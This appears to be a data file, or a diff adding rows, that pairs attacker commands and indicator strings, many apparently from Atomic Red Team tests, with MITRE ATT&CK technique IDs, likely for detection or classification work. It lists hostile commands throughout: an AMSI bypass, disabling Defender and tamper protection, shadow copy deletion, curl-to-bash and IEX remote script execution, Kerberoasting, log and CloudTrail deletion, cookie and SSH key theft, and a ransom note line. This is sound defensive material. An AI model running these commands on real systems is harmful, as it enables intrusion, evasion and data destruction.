+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,T1060
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f",T1112
+iptables -F,T1562
+%AppData%\Microsoft\Windows\Start Menu\Programs\Startup,T1547
+taskmgr.exe /7,T1057
+"""""%PROGRAMFILES%\dcrypt""\$dcrypt_exe""",T1486
+"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""",T1562
+EnvironmentVariables,T1547
+CreateNoWindow,T1564
+find $search_path -name id_rsa 2>/dev/null >> $output_file,T1552
+Invoke-Kerberoast | fl,T1558
+delete shadows /all /quiet,T1490
+"throw @""",T1218
+powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”,T1059
+"Update.exe --processStart {PATH:.exe} --process-start-args ""{CMD:args}""",T1218
+foreach ($secondarydirectory in $folderarray),T1083
+DeployJava.js,T1518
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
+ls -la ~/.bash_logout,T1562
+PSReadLine,T1070
+echo $(openssl passwd -1 art) | pw mod user nobody -h 0,T1078
+"logger.exe RUN ""{CMD}""",T1202
+wiper-action,T1485
+"if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi",T1082
+kubectl,T1136
+"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",T1562
+AutodiaDLL,T1574
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose,T1069
+"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f",T1070
+sudo $program_path -f -i $ifname -t 3,T1040
+C:\Windows\System32\sethc.exe,T1546
+fodhelper.exe,T1548
+"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f",T1112
+"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f",T1546
+SendMessage,T1055
+if ($_ -match 'End of Silver Ticket attack') { break },T1558
+C:\User\1\,T1074
+file.io,T1567
+"$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }",T1614
+aws cloudtrail delete-trail --name $cloudtrail_name --region $region,T1562
+dist-packages,T1546
+$screenshot,T1113
+runexehelper.exe {PATH_ABSOLUTE:.exe},T1218
+%APPDATA%\Microsoft\UserSetting,T1074
+HKCR\CLSID\...\InprocServer32,T1112
+com.[random_name].plist,T1543
+HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll /f,T1547
+curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,T1059
+psexec.py '$domain/$username:$password@$remote_host' '$command',T1569
+"echo 'echo ""User: $(whoami)""' >> /tmp/art_payload.sh",T1027
+HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\,T1547
+NetUserEnum,T1087
+netsh.exe add helper {PATH_ABSOLUTE:.dll},T1546
+ioreg,T1082
+%USERPROFILE%\AppData\Roaming,T1074
+net.exe,T1531
+Invoke-Expression $streamcommand,T1059
+"reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""$malicious_file""",T1547
+sudo cat /dev/null > $system_log_path #truncating the file to zero bytes,T1070
+"sc.exe create $service_name binPath= ""$executable_command""",T1564
+cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password,T1021
+__fnDWORD,T1574
+ImportKeyPair,T1098
+"IF EXIST ""%temp%\Windows_Defender_Verification.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Verification"" /f )",T1562
+cd $PathToAtomicsFolder\T1560.001\victim-files,T1560
+echo $ENCODED > $encoded_file && base64 -d < $encoded_file,T1140
+-s,T1543
+"echo ""4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
+gcloud logging logs delete projects/$project-id/logs/cloudaudit.googleapis.com%2Factivity --quiet,T1562
+chmod +x $autosuid,T1059
+if($reboot){Restart-Computer},T1546
+ipconfig/all,T1016
+dotnet.exe msbuild {PATH:.csproj},T1218
+sfind,T1083
+"Add-Content ""$env:APPDATA\slipDays.bak"" $days_to_modify",T1070
+mv $settings_json_def $settings_json_tmp,T1547
+sudo visudo -c -f /usr/local/etc/sudoers,T1548
+"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f",T1112
+then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/$syslog_ng_config_file_name,T1562
+copy c:\windows\system32\calc.exe 'C:\users\$user\AppData\local\Microsoft\WindowsApps\foxprow.exe',T1021
+"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",T1070
+PIS-APP,T1070
+EstsoftAutoUpdate,T1547
+$output | Out-File -FilePath $outputFilePath -Encoding ascii,T1560
+"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""$inf_to_execute""",T1218
+"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Exec""",T1059
+/c cd /d c:\windows\temp\ & reg query HKEY_CURRENT_USER\Software\<username>\PuTTY\Sessions\,T1012
+IP Helper,T1036
+C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe,T1218
+schtasks /query /tn win32times,T1036
+Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null,T1484
+InstallUtil.exe,T1218
+"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""0"" /f",T1562
+"set-content -path . -stream $ads_filename -value ""test3""",T1564
+EnumpropsExW,T1106
+pw usermod nobody -s /bin/sh,T1078
+unshadow,T1003
+"'@ -OutputAssembly ""$executable_filepath""",T1036
+"sc.exe \\$remote_host create $service_name binPath= ""$binary_path"" start=$startup_type type=$service_type",T1543
+query user >> %file%,T1033
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce,T1012
+inkform.exe,T1553
+"Write-Host "" [-] ${user}:$password invalid credentials.`r`n""",T1110
+cmd.exe /c chcp >&2,T1614
+"FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b",T1218
+"set DOTNET_STARTUP_HOOKS=""$preloader_dll""",T1574
+InfoClass=7,T1622
+aws iam create-user --user-name $username,T1136
+LaunchDaemons,T1543
+dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser,T1078
+"Write-Host ""The federation setup failed""",T1484
+sudo log erase --ttl #Deletes only time-to-live log content,T1070
+ForEach-Object {,T1007
+if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null },T1560
+Set-MpPreference -DisableBehaviorMonitoring 1,T1562
+"""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c $sqlite3_path ""$CookieDBLocation"" | out-file -filepath ""$output_file""",T1539
+LderGetProcedureAddress(),T1027
+"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f",T1484
+load(),T1129
+REGSVR,T1218
+"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f",T1547
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",T1564
+Remove-Item (Get-PSReadlineOption).HistorySavePath,T1070
+New-Item -type Directory $ExcelRegPath | Out-Null,T1137
+"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }",T1547
+audit.conf,T1562
+MicrosoftEdgeCrashRepoeterTaskMachineUA,T1036
+"$orgWallpaper | Out-File -FilePath ""$pointer_to_orginal_wallpaper""",T1491
